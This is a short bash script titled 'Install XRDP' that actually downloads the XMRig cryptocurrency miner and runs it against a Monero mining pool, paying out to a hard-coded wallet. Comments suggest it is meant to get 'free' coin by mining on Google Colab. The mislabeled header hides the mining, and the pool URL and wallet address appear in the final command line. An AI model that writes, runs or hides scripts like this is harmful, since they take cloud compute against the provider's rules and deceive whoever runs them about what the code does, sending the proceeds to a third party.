#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
tar xvzf xmrig-6.18.0-linux-x64.tar.gz
cd xmrig-6.18.0
./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 43uAvLvPfqqE2BDptK8SpzPUuFf9sGevSJD5FuQxihaxcgYpbJ6PkkJX8cDo9YW8Wn1in1WuHJhrP9E6y8D6NkTNF37AZb3.RIG_02 -p x
